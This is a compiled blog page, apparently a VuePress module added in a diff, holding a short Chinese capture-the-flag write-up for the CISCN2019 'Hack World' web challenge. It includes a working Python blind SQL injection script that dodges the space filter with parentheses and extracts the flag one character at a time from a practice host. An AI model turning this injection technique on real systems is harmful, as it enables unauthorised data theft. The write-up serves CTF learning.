@@ -1,0 +1,18 @@
+import{_ as a,r as e,o as t,c as o,a as n,b as p,d as c,e as l}from"./app-91d1060a.js";const i={},r=l(`<p>#SQL 注入 #盲注</p><p>输入 1 2 有回显 ，其余数字不行，尝试注入（注释符号，绕过空格）提示 <code>SQL Injection Checked.</code> 输入一些符号提示回显 <code>bool(false)</code> 尝试盲注</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> string
+<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">&quot;http://node4.anna.nssctf.cn:28756/index.php&quot;</span>
+res <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>
+        sql <span class="token operator">=</span> <span class="token string">&quot;if(ascii(substr((select(flag)from(flag)),{0},1))={1},1,2)&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
+            i<span class="token punctuation">,</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+        <span class="token punctuation">)</span>
+        post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span> sql<span class="token punctuation">}</span>
+        result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">&quot;Hello&quot;</span> <span class="token keyword">in</span> result<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            res <span class="token operator">+=</span> j
+            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3),u={href:"https://blog.csdn.net/qq_45691294/article/details/108709683",target:"_blank",rel:"noopener noreferrer"};function d(k,v){const s=e("ExternalLinkIcon");return t(),o("div",null,[r,n("p",null,[n("a",u,[p("[CISCN2019 华北赛区 Day2 Web1]Hack World_沫忆末忆的博客-CSDN 博客"),c(s)])])])}const m=a(i,[["render",d],["__file","Web1.html.vue"]]);export{m as default};
